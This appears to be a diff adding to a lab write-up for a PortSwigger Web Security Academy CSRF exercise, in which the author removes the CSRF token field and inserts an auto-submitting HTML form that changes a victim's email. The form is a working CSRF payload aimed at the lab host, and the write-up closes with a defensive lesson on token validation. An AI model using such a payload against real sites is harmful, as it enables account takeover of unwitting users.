@@ -34,6 +34,22 @@ After recieving the lab details i copied it and go back to lab dasboard wher i g
 # I simply put the code in the html feild and store it to website server.
 # Then,i moved my code to victim server and modify the request by changing the mail address and removing the **Csrf Token Field** from the code.
 
+The modified code is shown below:-
+
+<html>
+  <body>
+    <form action="https://0aa700eb042d67968165118e00420081.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="testing123&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
 # Boom! we finally exploit the victim server and solbved the lab.
 
 **Key-Learning**:- If the token is present make sure to validate the token while adding its value as well as proper validation if it gets manually remove or omitted.
